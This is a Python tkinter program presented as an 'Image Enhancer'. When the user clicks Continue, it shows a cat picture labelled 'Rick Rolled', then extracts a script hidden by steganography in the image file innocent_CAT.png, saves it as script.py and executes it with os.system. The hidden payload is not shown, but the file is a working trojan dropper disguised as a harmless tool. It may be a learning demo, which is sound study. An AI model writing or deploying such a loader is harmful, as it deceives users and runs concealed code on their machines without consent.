import tkinter as tk
import os
import stepic
from PIL import Image, ImageTk

def resize_image_to_fit(img, max_width, max_height):
    width, height = img.size
    ratio = min(max_width / width, max_height / height)
    new_size = (int(width * ratio), int(height * ratio))
    return img.resize(new_size, Image.Resampling.LANCZOS)

def on_continue():
    
    root.destroy()
    
     # Path to the image
    image_path = "innocent_CAT.png"
    
    cat_root = tk.Tk()
    
    cat_root.geometry("450x600")
    cat_root.title("You've Been Rick Rolled!!!")
    
    label = tk.Label(cat_root, text="You've Been Rick Rolled!!!", font=("Comic Sans MS", 20))
    label.pack()
    
    img = Image.open(image_path)
    resized_img = resize_image_to_fit(img, 400, 450)
    tk_img = ImageTk.PhotoImage(resized_img)

    label1 = tk.Label(cat_root, image=tk_img)
    label1.image = tk_img
    label1.pack(pady=(40,0))
    
    cat_root.after(3000, lambda:[cat_root.destroy()])
    
    cat_root.mainloop()
    
    try:   
        
        # Extract the hidden data
        hidden_data = stepic.decode(img)
        
        # Save the extracted script to current dir
        cur_dir = os.getcwd()
        script = os.path.join(cur_dir, 'script.py')
        
        with open(script, 'w') as file:
            file.write(hidden_data)
        
        # Run the script
        os.system(f'python "{script}"')
        
    except Exception as e:
        print(f"Error: {e}")
        

root = tk.Tk()

root.geometry("450x600")
root.title("Image Enhancer")

root.config(background="#afa5a2")

label = tk.Label(root, text="IMAGE ENHANCER!!!", font=("Comic Sans MS", 25), background="#afa5a2")
label.pack(pady=(160,50))

button = tk.Button(root, text="CONTINUE", command= on_continue,font=("Comic Sans MS", 35), background="#1ffe00", fg= "white")
button.pack()

label1 = tk.Label(root, text="Click Continue To Add Enhance Your Image", font=("Comic Sans MS", 12), background="#afa5a2")
label1.pack(pady=(20,0))

root.mainloop()
